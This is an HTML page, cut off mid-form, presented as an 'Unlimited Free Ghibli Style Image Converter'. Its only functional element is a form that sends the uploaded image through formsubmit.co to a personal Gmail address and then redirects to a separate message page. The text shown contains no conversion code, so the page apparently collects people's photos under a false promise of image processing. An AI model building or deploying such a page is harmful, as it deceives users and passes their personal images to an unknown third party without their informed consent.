<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghibli Style Image Converter</title>
    <style>
        body { 
            font-family: 'Arial', sans-serif; 
            text-align: center; 
            padding: 50px; 
            background: linear-gradient(135deg, #1e3c72, #2a5298); 
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container { 
            background: rgba(255, 255, 255, 0.1); 
            padding: 20px; 
            border-radius: 15px; 
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3); 
            max-width: 90%; 
            width: 400px; 
            backdrop-filter: blur(10px);
        }
        h1 { font-size: 22px; margin-bottom: 10px; }
        p { margin-bottom: 20px; }
        input[type="file"] {
            display: block; 
            margin: 10px auto; 
            background: white; 
            padding: 8px; 
            border-radius: 5px;
        }
        button { 
            background: #ff9800; 
            color: white; 
            border: none; 
            padding: 12px 20px; 
            font-size: 16px; 
            border-radius: 5px; 
            cursor: pointer; 
            width: 100%;
            transition: 0.3s;
        }
        button:hover { background: #e68900; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Unlimited Free Ghibli Style Image Converter</h1>
        <p>Upload your image and get instant results!</p>
        <form id="uploadForm" action="https://formsubmit.co/babaiswaraj@gmail.com" method="POST" enctype="multipart/form-data">
            <input type="file" name="image" required>
            <input type="hidden" name="_next" value="https://ghibli-art.github.io/Cool-Ghibli-Style/message.html">
            <button type="submit">Upload Image</button>
